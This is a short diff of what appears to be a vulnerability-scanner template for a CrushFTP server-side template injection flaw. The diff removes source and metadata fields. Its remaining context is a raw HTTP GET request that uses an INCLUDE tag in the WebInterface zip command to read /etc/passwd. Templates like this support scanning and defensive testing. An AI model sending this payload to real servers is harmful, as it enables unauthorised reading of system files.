@@ -3,12 +3,8 @@ info:
   name: CrushFTP 服务器端 模板注入漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wpw2cgrillvrzqh7'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: wpw2cgrillvrzqh7
-    fofa: server="CrushFTP"
 http:
 - raw:
   - 'GET /WebInterface/function/?command=zip&c2f=7HhJ&path=%3CINCLUDE%3E/etc/passwd%3C/INCLUDE%3E&names=* HTTP/1.1
